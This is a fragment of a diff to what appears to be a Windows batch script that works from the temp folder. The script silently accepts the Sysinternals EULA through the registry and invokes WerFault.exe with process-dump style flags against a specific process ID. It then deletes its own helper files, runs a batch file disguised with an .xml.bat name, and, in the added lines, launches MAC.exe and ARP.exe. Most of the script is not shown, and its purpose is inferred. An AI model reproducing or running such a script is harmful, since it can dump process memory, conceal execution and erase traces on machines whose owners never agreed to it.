@@ -1,3 +1,4 @@
+cd /D "%temp%"
 reg add "HKCU\Software\Sysinternals" /v EulaAccepted /t REG_DWORD /d 1 /f
 timeout 2
 WerFault.exe -u -p 7968 -s 1096
@@ -48,5 +49,7 @@ del WerFault.exe
 del internet.bat
 AllSystemSettings_{253E530E-387D-4BC2-959D}.xml.bat
 timeout 2
+MAC.exe 
+ARP.exe
 exit
 
